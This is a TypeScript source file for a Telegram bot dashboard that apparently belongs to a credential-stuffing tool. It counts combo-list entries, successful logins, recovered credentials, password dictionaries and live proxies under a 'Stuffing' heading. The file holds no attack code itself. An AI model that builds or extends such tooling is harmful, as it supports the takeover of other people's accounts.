import { InlineKeyboard } from "grammy";
import { db } from "../../services/db.js";
import type { BotContext } from "../types.js";

export async function showDashboard(ctx: BotContext) {
  const userId = ctx.dbUser.id;

  const [
    taskCount,
    taskRunning,
    emailCount,
    authResults,
    comboTotal,
    comboPending,
    comboSuccess,
    recovered,
    dictCount,
    proxyAlive,
    proxyTotal,
  ] = await Promise.all([
    db.task.count({ where: { userId } }),
    db.task.count({ where: { userId, status: "PROCESSING" } }),
    db.email.count(),
    db.authResult.count(),
    db.comboEntry.count({ where: { userId } }),
    db.comboEntry.count({ where: { userId, status: "pending" } }),
    db.comboEntry.count({ where: { userId, status: "success" } }),
    db.recoveredCredential.count({ where: { userId } }),
    db.passwordDictionary.count({ where: { userId } }),
    db.proxy.count({ where: { status: "alive" } }),
    db.proxy.count(),
  ]);

  const uptime = Math.floor(process.uptime());
  const hours = Math.floor(uptime / 3600);
  const mins = Math.floor((uptime % 3600) / 60);

  const text =
    `📊 <b>Dashboard</b>\n\n` +
    `⏱ Uptime: ${hours}h ${mins}m\n` +
    `🌐 Proxies: ${proxyAlive}/${proxyTotal} alive\n\n` +
    `<b>📋 Tasks:</b>\n` +
    `  Total: ${taskCount} | Running: ${taskRunning}\n\n` +
    `<b>📧 Data:</b>\n` +
    `  Emails: ${emailCount.toLocaleString()}\n` +
    `  Auth Results: ${authResults.toLocaleString()}\n\n` +
    `<b>💀 Stuffing:</b>\n` +
    `  Combos: ${comboTotal.toLocaleString()}\n` +
    `  Pending: ${comboPending.toLocaleString()}\n` +
    `  Success: ${comboSuccess.toLocaleString()}\n\n` +
    `<b>🔑 Recovery:</b>\n` +
    `  Recovered: ${recovered}\n` +
    `  Dictionaries: ${dictCount}\n`;

  const kb = new InlineKeyboard()
    .text("🔄 Refresh", "dash:refresh")
    .row()
    .text("◀ Аналитика", "section:analytics");

  if (ctx.callbackQuery) {
    await ctx.answerCallbackQuery();
    await ctx.editMessageText(text, { parse_mode: "HTML", reply_markup: kb });
  } else {
    await ctx.reply(text, { parse_mode: "HTML", reply_markup: kb });
  }
}

export async function handleDashboardCallback(ctx: BotContext) {
  const data = ctx.callbackQuery?.data;
  if (!data?.startsWith("dash:")) return;

  if (data === "dash:refresh") {
    return showDashboard(ctx);
  }

  await ctx.answerCallbackQuery();
}
